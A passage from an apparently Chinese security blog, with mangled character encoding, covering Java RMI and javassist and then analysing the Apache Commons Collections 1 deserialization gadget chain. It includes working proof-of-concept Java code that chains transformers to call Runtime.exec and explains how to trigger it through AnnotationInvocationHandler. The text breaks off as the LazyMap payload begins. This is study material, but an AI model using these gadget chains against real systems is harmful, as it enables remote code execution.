Naming.lookup(&quot;rmi:&#x2F;&#x2F;localhost:1099&#x2F;hello&quot;);&#x2F;&#x2F;æ­¤åˆ»å®¢æˆ·ç«¯æŸ¥æ‰¾å‡ºäº†helloå¯¹è±¡çš„stubæ‰€åœ¨url,æœåŠ¡ç«¯è¿”å›helloå¯¹è±¡çš„Stub&#x2F;&#x2F;æ­¤æ—¶çš„æ•°æ®ç±»å‹ä¼¼ä¹å¿…é¡»æ˜¯æ¥å£ç±» Stubå’ŒSkeleton ç”±ä¸Šæ–‡å¯çŸ¥å½“å®¢æˆ·æœºè¿œç¨‹è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶,è¿”å›çš„å…¶å®ä¸æ˜¯å¯¹è±¡æœ¬èº«,è€Œæ˜¯stub.ä½ å¯ä»¥ç†è§£stubä¸ºä¸€ä¸ªä¸­ç»§ç«™ï¼Œå½“å®¢æˆ·æœºè°ƒç”¨è¯¥å¯¹è±¡æŸä¸ªæ–¹æ³•æ—¶,å®é™…ä¸Šæ˜¯é€šè¿‡stubä»¥socketçš„æ–¹å¼å‘æœåŠ¡å™¨ç«¯çš„skeletonå‘é€åºåˆ—åŒ–å¤„ç†çš„æ–¹æ³•åå’Œå‚æ•°ï¼ˆskeletonå¯ä»¥ç†è§£ä¸ºæœåŠ¡å™¨ç«¯ä¸Šçš„çœŸå®å¯¹è±¡)æœåŠ¡ç«¯çš„skeletionååºåˆ—åŒ–å¾—åˆ°çš„æ–¹æ³•åå’Œå‚æ•°å¹¶å¤„ç†åå†ä»¥socketçš„æ–¹å¼æŠŠè¯¥æ–¹æ³•ç”Ÿæˆçš„ç»“æœä¼ å›stub,stubå†æŠŠæ•°æ®è¿”å›ç»™å®¢æˆ·æœº ä»£ç å®ç°è¿œç¨‹è°ƒç”¨æœåŠ¡å™¨ç«¯import java.rmi.Remote;import java.rmi.registry.*;import java.rmi.RemoteException;import java.rmi.server.UnicastRemoteObject;interface Hello extends Remote&#123; public String sayHello(String name) throws RemoteException;&#125;class HelloImpl extends UnicastRemoteObject implements Hello&#123; protected HelloImpl()throws RemoteException &#123; super(); &#125; public String sayHello(String name) throws RemoteException&#123; return &quot;Hello&quot;+name; &#125;&#125;------------------------------------------------------------------public class Server&#123; public static void main(String[] args)&#123; try&#123;&#x2F;&#x2F;å¿…é¡»æœ‰try..catch Hello hello &#x3D; new HelloImpl(); &#x2F;&#x2F;ä¼¼ä¹æ•°æ®ç±»å‹åªèƒ½æ˜¯æ¥å£ç±» LocateRegistry.createRegistry(1080); &#x2F;&#x2F;å°†RMI registryçš„ç«¯å£è®¾ç½®ä¸º1080 java.rmi.Naming.rebind(&quot;rmi:&#x2F;&#x2F;localhost:1080&#x2F;hello&quot;, hello);&#x2F;&#x2F;å°†helloè¿™ä¸ªæ–¹æ³•å¯¹è±¡ç»‘å®šåœ¨æŒ‡å®šurlä¸Š,rmiåè®® System.out.print(&quot;OK&quot;); &#125;catch(Exception e)&#123; e.printStackTrace(); &#125;&#125;&#125;å®¢æˆ·æœºç«¯import java.rmi.Remote;import java.rmi.registry.*;import java.rmi.RemoteException;import java.rmi.server.UnicastRemoteObject;import java.rmi.Naming;public class Client&#123; public static void main(String[] args)&#123; try&#123;&#x2F;&#x2F;å¿…é¡»æœ‰try..catch Hello hello_client &#x3D; (Hello) Naming.lookup(&quot;rmi:&#x2F;&#x2F;localhost:1080&#x2F;hello&quot;); &#x2F;&#x2F;æœåŠ¡å™¨ç«¯ç»‘å®šåœ¨è¯¥urlçš„å¯¹è±¡æ•°æ®ç±»å‹æ˜¯Helloï¼Œæ‰€ä»¥è¿™é‡Œçš„æ•°æ®ç±»å‹ä¹Ÿæ˜¯Hello System.out.print(hello_client.sayHello(&quot;fuck&quot;)); &#125;catch(Exception e)&#123; e.printStackTrace(); &#125; &#125;&#125; ç»“æœ javassistjavassist æ˜¯ä¸€ä¸ªç±»åº“ï¼Œç”¨äºæ“ä½œjavaå­—èŠ‚ç ã€‚ æ¯”å¦‚æˆ‘ä»¬æ¥ä¸‹æ¥å°±ä¼šä½¿ç”¨javassistæ¥åŠ¨æ€æ“ä½œå­—èŠ‚ç ã€‚ test2.javapublic class test2 &#123; public void gogo()&#123; System.out.println(&quot;yuansheng&quot;); &#125;&#125;test1.javaimport javassist.*;public class test1 &#123; public static void main(String[] args) throws Exception&#123; ClassPool pool &#x3D; ClassPool.getDefault(); CtClass class1 &#x3D; pool.get(test2.class.getName()); String cmd &#x3D; &quot;System.out.print(\\&quot;hello\\&quot;);&quot;; class1.makeClassInitializer().insertBefore(cmd); \\\\æ’å…¥staticé™æ€ä»£ç å—ï¼Œå†…å®¹ä¸ºcmdä¸­å†…å®¹ class1.setName(&quot;class1&quot;); \\\\ä¸ºæ–°ç±»å‘½åä¸ºclass1 class1.writeFile(&quot;d:\\\\test&quot;); \\\\å°†ç±»å†™å…¥d:\\\\testæ–‡ä»¶å¤¹ &#125;&#125; åç¼–è¯‘d:\\\\test\\\\class1.class &#x2F;&#x2F;&#x2F;&#x2F; Source code recreated from a .class file by IntelliJ IDEA&#x2F;&#x2F; (powered by FernFlower decompiler)&#x2F;&#x2F;public class class1 &#123; public class1() &#123; &#125; public void gogo() &#123; System.out.println(&quot;yuansheng&quot;); &#125; static &#123; System.out.print(&quot;hello&quot;); &#125;&#125; å‘ç°æˆ‘ä»¬å·²ç»å¾€test2.javaçš„å†…å®¹ä¸­æ’å…¥äº†è¾“å‡ºhelloçš„é™æ€ä»£ç å—ï¼Œå¹¶ä»¥class1.classå†™å…¥d:\\\\testæ–‡ä»¶å¤¹ã€‚ javassistçš„åŠŸèƒ½é™¤æ­¤ä¹‹å¤–è¿˜æœ‰å¾ˆå¤š","categories":[],"tags":[{"name":"javaå¼€å‘ä¸å®‰å…¨","slug":"javaå¼€å‘ä¸å®‰å…¨","permalink":"http://const27.com/tags/java%E5%BC%80%E5%8F%91%E4%B8%8E%E5%AE%89%E5%85%A8/"}]},{"title":"Apache-Commons-Collections1 ååºåˆ—åŒ–åˆ†æ","slug":"Apache-Commons-Collections1 ååºåˆ—åŒ–åˆ†æ","date":"2021-06-28T13:51:11.039Z","updated":"2021-06-28T13:47:27.546Z","comments":true,"path":"2021/06/28/Apache-Commons-Collections1 ååºåˆ—åŒ–åˆ†æ/","link":"","permalink":"http://const27.com/2021/06/28/Apache-Commons-Collections1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/","excerpt":"","text":"Transformer Map é“¾RCEåŸç†æˆ‘åœ¨ç½‘ä¸Šæ‰¾åˆ°äº†ä¸€åˆ™åˆ©ç”¨ä»£ç ï¼Œè™½ç„¶è¿™ä¸ªåˆ©ç”¨ä»£ç å¾ˆç²—æµ…ï¼Œå¹¶æ²¡æœ‰CCé“¾1çš„è§¦å‘è¿‡ç¨‹ï¼Œä½†æ˜¯å¯¹äºè¿™æ¡é“¾çš„åŸç†è¿˜æ˜¯å¯è§ä¸€æ–‘çš„ã€‚ import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.util.HashMap;import java.util.Map;public class test &#123; public static void main(String[] args) throws Exception &#123; Transformer[] transformers &#x3D; new Transformer[]&#123; new ConstantTransformer(Runtime.getRuntime()), new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[] &#123;&quot;calc.exe&quot;&#125;), &#125;; Transformer transformerChain &#x3D; new ChainedTransformer(transformers); Map innerMap &#x3D; new HashMap(); Map outerMap &#x3D; TransformedMap.decorate(innerMap, null, transformerChain); outerMap.put(&quot;test&quot;, &quot;xxxx&quot;); &#125;&#125; TransformerMapç±»TransformerMapç±»æ˜¯é€ æˆè¿™ä¸ªæ¼æ´çš„åŸå› ä¹‹ä¸€ TransformerMapæ˜¯apacheCommonsCollectionsé‡Œæä¾›çš„ä¸€ä¸ªæ•°æ®ç±»å‹ã€‚å®ƒå¯ä»¥ä¿®é¥°ä¸€ä¸ªMapç±»å‹çš„å¯¹è±¡ã€‚å½“ä¿®é¥°è¿‡çš„Mapæ·»åŠ æ–°å…ƒç´ æ—¶ï¼Œå®ƒä¼šè°ƒç”¨åœ¨decorateé‡Œå£°æ˜å¥½çš„Trasnformerç±»çš„transformæ–¹æ³•å¹¶ä¼ å…¥æ–°æ·»çš„é”®åæˆ–å€¼åã€‚ Map DecoratedMap &#x3D; TransformedMap.decorateï¼ˆMap,keyTransformer,valueTransformerï¼‰ keyTransformerå’ŒvalueTransformeråˆ†åˆ«æŒ‡å‘ä¸åŒçš„Transformerç±»ã€‚ Transformerç±»æˆ‘ä»¬çœ‹ä¸€ä¸‹Transformerç±» å¯ä»¥å‘ç°å®ƒåªæ˜¯ä¸€ä¸ªå€Ÿå£ï¼Œä»–çš„æ–¹æ³•éœ€è¦å…¶ä»–å­ç±»å®ç°ã€‚å½“TransformerMapåœ¨æ–°æ·»å…ƒç´ æ—¶å°±ä¼šè°ƒç”¨decorateé‡Œè®¾å®šå¥½çš„Transformerç±»çš„transformæ–¹æ³•ã€‚å®ƒçš„æ¥å£å®ç°ç±»æœ‰ä»¥ä¸‹å‡ ä¸ªã€‚ ConstantTransformerè¿™ä¸ªç±»ä¸»è¦çš„ä¸¤ä¸ªæ–¹æ³•å°±æ˜¯è¿™ä¿©äº†ã€‚ public ConstantTransformer(Object constantToReturn) &#123; this.iConstant &#x3D; constantToReturn; &#125; public Object transform(Object input) &#123; return this.iConstant; &#125; æ²¡ä»€ä¹ˆå¥½è¯´çš„ï¼Œå°±æ˜¯æŠŠä¼ å…¥çš„å¯¹è±¡åŸåŸæœ¬æœ¬è¿”å›ã€‚ InvokerTransformerä¹Ÿæ˜¯ä¸¤ä¸ªé‡è¦æ–¹æ³• public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123; this.iMethodName &#x3D; methodName; this.iParamTypes &#x3D; paramTypes; this.iArgs &#x3D; args; &#125; public Object transform(Object input) &#123; if (input &#x3D;&#x3D; null) &#123; return null; &#125; else &#123; try &#123; Class cls &#x3D; input.getClass(); Method method &#x3D; cls.getMethod(this.iMethodName, this.iParamTypes); return method.invoke(input, this.iArgs); &#125; catch (NoSuchMethodException var5) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#39;&quot; + this.iMethodName + &quot;&#39; on &#39;&quot; + input.getClass() + &quot;&#39; does not exist&quot;); &#125; catch (IllegalAccessException var6) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#39;&quot; + this.iMethodName + &quot;&#39; on &#39;&quot; + input.getClass() + &quot;&#39; cannot be accessed&quot;); &#125; catch (InvocationTargetException var7) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#39;&quot; + this.iMethodName + &quot;&#39; on &#39;&quot; + input.getClass() + &quot;&#39; threw an exception&quot;, var7); &#125; &#125; &#125; å°±æ˜¯ä¼ å…¥æ–¹æ³•åï¼Œå‚æ•°ç±»å‹å’Œå‚æ•°ï¼Œç„¶åé€šè¿‡åå°„æ¥æ‰§è¡Œè¿™ä¸ªæ–¹æ³• ChainedTransformerä¹Ÿæ˜¯ä¸¤ä¸ªé‡è¦æ–¹æ³• public ChainedTransformer(Transformer[] transformers) &#123; this.iTransformers &#x3D; transformers; &#125; public Object transform(Object object) &#123; for(int i &#x3D; 0; i &lt; this.iTransformers.length; ++i) &#123; object &#x3D; this.iTransformers[i].transform(object); &#125; return object; &#125; å°±æ˜¯æŠŠä¼ å…¥çš„å¤šä¸ªTransfomerç±»çš„transformeræ–¹æ³•ä¾æ¬¡æ‰§è¡Œï¼Œæ¯ä¸ªtransformeræ–¹æ³•æ‰§è¡Œåè¿”å›çš„å¯¹è±¡ä¼šè¢«å½“åšä¸‹ä¸€æ¬¡æ‰§è¡Œçš„æ—¶å€™ä¼ å…¥çš„å‚æ•°ã€‚ é€šè¿‡ä»¥ä¸Šä¿¡æ¯ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ¸…æ™°çš„çœ‹æ‡‚ä¸Šé¢çš„payloadäº†ã€‚å…ˆé€šè¿‡ConstantTransformerè·å¾— Runtimeç±»ï¼Œå†é€šè¿‡InvokerTransformeræ‰§è¡Œexecæ–¹æ³•ï¼Œç„¶åé€šè¿‡ChainedTransformerå°†ä¸¤ä¸ªç±»ä¸²èµ·æ¥ï¼Œè®©InvokerTransformerä»¥ConstantTrasformerè¿”å›çš„Runtimeç±»ä¸ºå‚æ•°æ‰§è¡Œexecæ–¹æ³•ï¼Œè¾¾åˆ°RCEçš„ç›®çš„ã€‚ è§¦å‘è§¦å‘ï¼Œæˆ‘ä»¬é€‰æ‹©çš„åœ°æ–¹æ˜¯sun.reflect.annotation.AnnotationInvocationHandlerçš„readObjectæ–¹æ³•ï¼Œååºåˆ—åŒ–çš„å…¥å£ç‚¹åŸºæœ¬éƒ½åœ¨è¿™é‡Œï¼šreadobjcectæ–¹æ³•ã€‚ï¼ˆæ³¨æ„8u71ä»¥ä¸‹æ‰èƒ½æœ‰è§¦å‘ç‚¹ï¼Œä¹‹åçš„ç‰ˆæœ¬å·²è¢«ä¿®å¤ï¼‰ è§¦å‘ç‚¹ä»£ç ã€‚æˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œå®ƒå¯¹ä¼ å…¥çš„mapçš„æ¯ä¸€ä¸ªvalueæ‰§è¡Œäº†setValueã€‚ å¯ä»¥å¾ˆæ˜æ˜¾çš„å‘ç°ä¼šå¯¹å€¼è¿›è¡Œtransformæ–¹æ³•ã€‚ä¹Ÿå°±æ˜¯ç›¸å½“äºè§¦å‘äº†ä¸€æ¬¡Map.put()ã€‚æ¥ä¸‹æ¥ï¼Œå°±æ˜¯payloadæ„é€ æ—¶é—´äº†ã€‚ ä½†æ˜¯ AnnotationInvocationHandler æ˜¯å†…éƒ¨ç±»æ— æ³•ç›´æ¥å®ä¾‹åŒ–ï¼Œä½†å®ƒçš„çˆ¶ç±»InvocationHandlerå¯ä»¥ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åå°„å¾—åˆ° AnnotationInvocationHandler æ„é€ æ–¹æ³•ï¼Œç„¶åå¯¹å…¶ä½¿ç”¨newInstanceå†å‘ä¸Šè½¬å‹ä¸ºçˆ¶ç±» InvocationHandler ã€‚æ—¢ç„¶è¦è·å¾—å¯¹è±¡ï¼Œæˆ‘ä»¬å°±åº”è¯¥å…³æ³¨ä¸€ä¸‹å®ƒçš„æ„é€ æ–¹æ³•ã€‚ AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2) &#123; Class[] var3 &#x3D; var1.getInterfaces(); if (var1.isAnnotation() &amp;&amp; var3.length &#x3D;&#x3D; 1 &amp;&amp; var3[0] &#x3D;&#x3D; Annotation.class) &#123; this.type &#x3D; var1; this.memberValues &#x3D; var2; &#125; else &#123; throw new AnnotationFormatError(&quot;Attempt to create proxy for a non-annotation type.&quot;); &#125;&#125; è¦ä¼ å…¥ä¸¤ä¸ªå‚æ•°ï¼Œvar2ä¸ç”¨è¯´äº†å°±æ˜¯æˆ‘ä»¬ä¼ å…¥çš„Mapï¼Œvar1å‘¢ï¼Ÿæ˜¯Annotationç±»ï¼Œå³æ‰€æœ‰æ³¨é‡Šç±»çš„æ¥å£ã€‚æˆ‘ä»¬å¿…é¡»åœ¨æ­¤å¤„ä¼ å…¥ä¸€ä¸ªæ³¨é‡Šç±»æ‰èƒ½ä½¿ifåˆ¤æ–­ä¸ºçœŸï¼Œæ‰èƒ½æŠŠæˆ‘ä»¬çš„å‚æ•°ä¸­çš„Mapä¼ å…¥ã€‚ä½†æ˜¯å¹¶ä¸æ˜¯æ‰€æœ‰æ³¨é‡Šç±»ä¼ è¿›å»éƒ½æœ‰æ•ˆï¼Œæ³¨é‡Šç±»ï¼ˆå®é™…ä¸Šå°±æ˜¯æ¥å£ï¼‰å¿…é¡»æœ‰å®šä¹‰çš„æ–¹æ³•æ‰èƒ½æ­£å¸¸è§¦å‘ååºåˆ—åŒ–ã€‚å…³äºæ­¤ç‚¹æˆ‘ä»¬åé¢å†è¯¦ç»†è°ˆè°ˆã€‚ å› ä¸ºå†readObjectæ–¹æ³•é‡Œæˆ‘ä»¬ä¼šæ‰§è¡Œ**Map var3 = var2.memberTypes()**ï¼Œæˆ‘ä»¬çœ‹çœ‹memberTypesæºç ã€‚ å‘ç°æ˜¯è¿”å›æ„é€ æ–¹æ³•ä¸­å®šä¹‰å¥½çš„memberTypeså±æ€§ã€‚è€Œè¿™ä¸ªmemberTypeså±æ€§åˆå’Œä¸Šä¸€è¡Œçš„var2å±æ€§æœ‰å…³ï¼Œvar2å±æ€§åˆä¸getDecalredMethodsæœ‰å…³â€¦å› æ­¤æˆ‘æ‰çŒœæµ‹ â€œæ³¨é‡Šç±»å¿…é¡»æœ‰å®šä¹‰çš„æ–¹æ³•æ‰èƒ½æ­£å¸¸è§¦å‘ååºåˆ—åŒ– â€œ,ä½†å®é™…ç»“æœç¡®å®å¦‚æ­¤ã€‚ç›®å‰æ‰¾åˆ°çš„èƒ½å¤Ÿæ­£å¸¸è§¦å‘æ¼æ´çš„æ³¨é‡Šç±»æœ‰ Target Retention SuppressWarnings .æ— ä¸€ä¾‹å¤–ä»–ä»¬ä½œä¸ºæ¥å£éƒ½å®šä¹‰äº†æ–¹æ³•ã€‚è€Œä¸”åœ¨æˆ‘ç¿»é˜…ä¸€äº›å‚è€ƒæ–‡æ¡£åï¼Œå‘ç°ç¡®å®æ˜¯è¿™æ · å¦å¤–ä¸€ç‚¹éœ€è¦æ³¨æ˜çš„æ˜¯ï¼ŒRuntimeç±»æ²¡æœ‰ç»§æ‰¿Serializeæ¥å£ï¼Œä¹Ÿå°±æ˜¯è¯´å®ƒä¸èƒ½è¢«ç›´æ¥åºåˆ—åŒ–ã€‚ä¹Ÿå°±æ˜¯è¯´å¦‚æœæˆ‘ä»¬åœ¨transformeré“¾é‡Œæƒ³ç›´æ¥é€šè¿‡æœ‰*new ConstantTransformer(Runtime.\\getRuntime*())**æ¥è·å–Runtimeå¯¹è±¡æ—¶ï¼Œä¼šååºåˆ—åŒ–å¤±è´¥ã€‚ä½†æ˜¯Classç±»æ˜¯æœ‰ç»§æ‰¿Serializeæ¥å£çš„ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡transformeré“¾å’Œåå°„æ¥åœ¨ååºåˆ—åŒ–é˜¶æ®µé€æ­¥åˆ›å»ºRuntimeç±»ï¼Œç»§è€Œè§£å†³è¿™ä¸ªé—®é¢˜ æ€»ç»“ä¸€ä¸‹å‡ ä¸ªå‘ç‚¹ï¼š1.Runtimeç±»ä¸èƒ½è¢«åºåˆ—åŒ–\\2. AnnotationInvocationHandler æ— æ³•ç›´æ¥å®ä¾‹åŒ–ï¼Œå¯é€šè¿‡åå°„è·å¾—å¯¹è±¡3.æ³¨æ„åœ¨å®ä¾‹åŒ– AnnotationInvocationHandler æ—¶è¦ä¼ å…¥å®šä¹‰å¥½æ–¹æ³•çš„æ³¨é‡Šç±»OKï¼Œä»¥ä¸ŠçŸ¥é“äº†åå°±èƒ½è¯•ç€å†™ä¸€ä¸‹payloadäº†ï¼ˆè¿™ä¸ªpayloadä¾æ—§ä¸èƒ½æ­£å¸¸æ‰§è¡Œï¼Œé”™è¯¯å‡ºå¤„é—´ä»£ç æ³¨é‡Šï¼Œå…·ä½“åŸå› çœ‹ä¸‹æ–‡ï¼‰ã€‚ import java.io.*;import java.lang.annotation.*;import java.lang.reflect.*;import java.util.*;import org.apache.commons.collections.*;import org.apache.commons.collections.functors.*;import org.apache.commons.collections.map.TransformedMap;public class test2 &#123; public static void main(String[] args)&#123; try &#123; Transformer[] transformers &#x3D; new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;new String(&quot;getRuntime&quot;),new Class[0]&#125;), new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,new Object[0]&#125;), new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;new String(&quot;calc.exe&quot;)&#125;), &#125;; ChainedTransformer chain &#x3D; new ChainedTransformer(transformers); Map innermap &#x3D; new HashMap(); innermap.put(&quot;sc&quot;,&quot;b&quot;); &#x2F;&#x2F;ä¸èƒ½æ‰§è¡Œçš„åŸå› åœ¨è¿™é‡Œï¼Œå¦‚æœæ˜¯put(&quot;value&quot;,&quot;a&quot;)å°±å¯ä»¥æ­£å¸¸æ‰§è¡Œ Map outmap &#x3D; TransformedMap.decorate(innermap,null,chain); Class Annotation &#x3D; Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor AnnotationCons &#x3D; Annotation.getDeclaredConstructor(Class.class,Map.class); AnnotationCons.setAccessible(true); InvocationHandler InvocationHandler &#x3D; (InvocationHandler) AnnotationCons.newInstance(Target.class,outmap); ObjectOutputStream a &#x3D; new ObjectOutputStream(new FileOutputStream(new File(&quot;a.bin&quot;))); a.writeObject(InvocationHandler); a.close(); ObjectInputStream b &#x3D; new ObjectInputStream(new FileInputStream(&quot;a.bin&quot;)); b.readObject(); b.close(); &#125; catch (Exception e)&#123;e.printStackTrace();&#125; &#125;&#125; ä¸ºä»€ä¹ˆä¸èƒ½æ‰§è¡Œï¼Œè¿™åŸå› ä¸ä¸Šé¢æåˆ°çš„â€œ æ³¨æ„åœ¨å®ä¾‹åŒ– AnnotationInvocationHandler æ—¶è¦ä¼ å…¥å®šä¹‰å¥½æ–¹æ³•çš„æ³¨é‡Šç±» â€å¾ˆæœ‰å…³è”ã€‚å› ä¸ºæ¶‰åŠJVMçš„ä¸€äº›ä¸œè¥¿ï¼Œæˆ‘ä»¬ä¸ä¼šæ€ä¹ˆå»æ·±ç©¶ï¼Œå°±æ˜¯æµ…æµ…çš„çœ‹ä¸€ä¸‹ï¼Œåšå‡ºä¸€äº›æ¨æµ‹ã€‚ é¦–å…ˆæˆ‘ä»¬å…³æ³¨åˆ° AnnotationInvocationHandler çš„readObjectã€‚ æ¥ä¸‹æ¥å°±æ˜¯å¤æ‚çš„æ¨ç†äº†ï¼Œå»ºè®®å…ˆæŠŠå„æ–¹æ³•çš„æ„ä¹‰å¼„æ˜ç™½å‘ç°å¿…é¡»è¦var7ï¼=nullæ‰èƒ½æ­£å¸¸è§¦å‘ååºåˆ—åŒ–æ¼æ´ï¼Œé‚£ä¹ˆvar7çš„æ¥æºæ˜¯ä»(Map)var3ä¸­è·å¾—ä»¥(String)var6ä¸ºé”®åçš„å€¼ã€‚var6æ˜¯var3ä¸­ä¸€é¡¹çš„é”®åã€‚è€Œvar3çš„æ¥æºæ˜¯(Annotation)var2çš„menberTypes,æˆ‘ä»¬è·Ÿè¿›è¿™ä¸ªæ–¹æ³•ã€‚ é‚£ä¹ˆvar1å°±æ˜¯AnnotationInvocationHandlerçš„typeå±æ€§äº†ï¼Œè€Œè¿™ä¸ªtypeå±æ€§åœ¨å…¶æ„é€ æ–¹æ³•ä¸­å°±å®šä¹‰å¥½äº†ï¼Œæ˜¯ä¼ å…¥çš„æ³¨é‡Šç±»ã€‚ä¹Ÿå°±æ˜¯è¯´var1å°±æ˜¯æˆ‘ä»¬åœ¨å®ä¾‹ AnnotationInvocationHandler æ—¶ä¼ å…¥çš„æ³¨é‡Šç±»ã€‚ç»“åˆä»¥ä¸Šæµç¨‹ï¼Œæˆ‘ä»¬å°±å¯ä»¥çŸ¥é“è¿™ä¸ªè¿‡ç¨‹æ˜¯:ä» å®ä¾‹ AnnotationInvocationHandler æ—¶ä¼ å…¥çš„æ³¨é‡Šç±» ä¸­è·å–æœ€åä¸€ä¸ªæ–¹æ³•ï¼Œç„¶åæŠŠå®ƒç¼–å…¥ä¸ºä¸€ä¸ªHashMap(ä»¥ä¸‹ç§°ä¸ºæ³¨é‡Šæ–¹æ³•Map)çš„ä¸€ä¸ªé”®åå¹¶ç»™äºˆå€¼ã€‚åœ¨readObjectæ—¶ä¼šéå†ä¼ å…¥çš„Mapï¼Œå¦‚æœåœ¨ä¼ å…¥çš„Mapä¸­æ‰¾åˆ°äº†ä¸€é¡¹çš„é”®ååœ¨æ³¨é‡Šæ–¹æ³•Mapä¸­å­˜åœ¨ï¼ˆå³ åœ¨ä¼ å…¥çš„Mapä¸­æ‰¾åˆ°äº†ä¸€é¡¹çš„é”®åä¸å®ä¾‹åŒ–æ—¶ä¼ å…¥çš„æ³¨é‡Šç±»çš„æœ€åä¸€ä¸ªæ–¹æ³•åŒåï¼‰ï¼Œåˆ™ifæ¡ä»¶ä¸ºçœŸï¼Œæ”»å‡»æˆåŠŸã€‚æ‰€ä»¥ä¸Šé¢ä¸ºä»€ä¹ˆput(â€œvalueâ€,ä»»æ„)æ‰èƒ½è¾¾æˆæ”»å‡»çš„åŸå› æ˜¯ï¼Œ Target Retention SuppressWarnings è¿™ä¸‰ä¸ªæ³¨é‡Šç±»éƒ½æœ‰ä¸”åªæœ‰ä¸€ä¸ªæ–¹æ³•åä¸ºvalueçš„æ–¹æ³•ã€‚ åˆ†æå®Œäº†ã€‚è¿™ä¸ªæ´åˆ©ç”¨ç‰ˆæœ¬åªèƒ½åœ¨8u71ä»¥å‰ï¼Œæ¯”è¾ƒå¤è€æ— ç”¨ã€‚ LazyMapé“¾RCEåŸç†LazyMapçš„è·å¾—æ–¹æ³•å’ŒTransfromerMapå·®ä¸å¤šã€‚ Map innerMap &#x3D; new HashMap(); Map outerMap &#x3D; LazyMap.decorate(innerMap, transformerChain);public Object get(Object key) &#123; if (!super.map.containsKey(key)) &#123; Object value &#x3D; this.factory.transform(key); super.map.put(key, value); return value; &#125; else &#123; return super.map.get(key); &#125; åœ¨å¯¹LazyMapä½¿ç”¨getæ–¹æ³•æ—¶ï¼Œå®ƒä¼šæ‰§è¡Œthis.factory.transform(key),è€Œthis.factory.transformå¦‚æœå»è·Ÿè¿›åˆ†æçš„è¯ï¼Œå®è´¨ä¸Šå°±æ˜¯è°ƒç”¨æˆ‘ä»¬åœ¨decorateä¼ è¿›å»çš„Transformerç±»ã€‚ è§¦å‘LazyMapçš„è§¦å‘ç‚¹ä¹Ÿåœ¨ AnnotationInvocationHandler ä¸­ï¼Œä½†ä¸æ˜¯åœ¨readObjectæ–¹æ³•ï¼Œè€Œæ˜¯åœ¨invokeæ–¹æ³•ã€‚invokeæ–¹æ³•ä¸­æœ‰ä¸€è¡Œ Object var6 &#x3D; this.memberValues.get(var4); å…¶ä¸­this.memberValesæ˜¯åœ¨æ„é€ æ–¹æ³•ä¸­å®šä¹‰ä¸ºä¼ å…¥çš„Mapã€‚ é‚£ä¹ˆinvokeæ–¹æ³•è¦æ€ä¹ˆæ‰èƒ½è§¦å‘å‘¢ï¼Ÿç­”æ¡ˆæ˜¯åŠ¨æ€ä»£ç†ã€‚ç†Ÿæ‚‰åŠ¨æ€ä»£ç†çš„æœ‹å‹è‚¯å®šç›´åˆ°ï¼Œinvokeæ–¹æ³•æ—¶åŠ¨æ€ä»£ç†ä¸­çš„ä¸€ä¸ªç‰¹æ®Šçš„æ–¹æ³•ï¼Œåœ¨ä»£ç†ç±»ä¸­æ— è®ºæ‰§è¡Œä»€ä¹ˆæ–¹æ³•ï¼Œå®è´¨ä¸Šéƒ½æ˜¯åœ¨æ‰§è¡Œinvokeæ–¹æ³•ã€‚ é‚£ä¹ˆæ¥ä¸‹æ¥å°±æ˜¯éªšæ€è·¯äº†ï¼šæˆ‘ä»¬é€šè¿‡åå°„å’Œå‘ä¸Šè½¬å‹å¾—åˆ°ä¸€ä¸ª AnnotationInvocationHandler(Class var1, Map var2) å¯¹è±¡ã€‚æ„å»ºä¸€ä¸ªMapçš„ä»£ç†ç±»ï¼Œå…¶ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯åˆšåˆšå¾—åˆ°çš„ AnnotationInvocationHandler å¯¹è±¡ï¼Œå†æ•…æŠ€é‡æ–½å°†å…¶é€šè¿‡å‘ä¸Šè½¬å‹å¾—åˆ°ä¸€ä¸ª AnnotationInvocationHandler å¯¹è±¡ã€‚å½“è¯¥å¯¹è±¡ååºåˆ—åŒ–æ‰§è¡ŒreadObjctæ–¹æ³•æ—¶ï¼Œä¼šæ‰§è¡Œä¸€ä¸‹entrysetæ–¹æ³• æœ¬è´¨ä¸Šæ¥è¯´ï¼Œæ˜¯å¯¹ä¸€ä¸ªä»£ç†ç±»æ‰§è¡Œäº†ä¸€ä¸‹entrySetæ–¹æ³•ï¼Œå³æ‰§è¡Œäº†ä»£ç†ç±»çš„invokeæ–¹æ³•ï¼Œåˆå› ä¸ºä»£ç†ç±»çš„ç¬¬ä¸‰ä¸ªå‚æ•°å¡«å…¥çš„æ˜¯ AnnotationInvocationHandler å¯¹è±¡ï¼Œå…¶å†…éƒ¨å·²ç»å†™å¥½äº†invokeæ–¹æ³•ï¼Œæ‰€ä»¥æ­¤å¤„æ‰§è¡Œçš„ä»£ç†ç±»çš„invokeæ–¹æ³•å³ AnnotationInvocationHandler å¯¹è±¡çš„invokeæ–¹æ³•ï¼Œç»§è€Œè§¦å‘äº†getæ–¹æ³•ï¼Œç»§è€Œè§¦å‘äº†æ¼æ´ã€‚è¿™æ˜¯ä¸€ä¸ªå¾ˆå¦™çš„åœ°æ–¹ å¤šè¯´æ— ç›Šï¼Œæ•´paylaodå§ import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import 